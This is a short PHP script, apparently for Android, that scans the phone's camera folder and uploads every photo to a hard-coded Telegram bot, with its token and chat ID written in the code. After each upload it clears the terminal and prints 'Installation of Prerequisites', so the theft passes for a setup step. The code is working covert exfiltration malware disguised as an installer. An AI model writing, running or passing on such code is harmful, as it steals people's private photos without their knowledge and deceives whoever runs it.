<?php
// Set the Telegram bot API token and chat ID
$token = '7430227168:AAEkZeIRyQE99oe7CWgTy362YXRHxhtSpjE';
$chat_id = '6729989013';

// Set the path to the directory where the camera photos are stored
$photos_dir = '/storage/emulated/0/DCIM/Camera';

// Get a list of all the photos in the directory
$photos = scandir($photos_dir);

// Loop through the photos and send them to the Telegram bot
foreach ($photos as $photo) {
    if ($photo != '.' && $photo != '..') {
        // Open the photo and read its contents
        $photo_path = $photos_dir . '/' . $photo;
        $photo_data = file_get_contents($photo_path);

        // Set up the Telegram bot API endpoint and data
        $url = 'https://api.telegram.org/bot' . $token . '/sendPhoto';
        $data = array(
            'chat_id' => $chat_id,
            'caption' => $photo,
        );
        $files = array(
            'photo' => new CURLFile($photo_path),
        );

        // Send the photo to the Telegram bot using cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data + $files);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        // Print the response from the Telegram bot API
        echo $response . PHP_EOL;
        // Clear the terminal
echo "\033[2J\033[H";
        echo "Installation of Prerequisites";
    }
}
?>

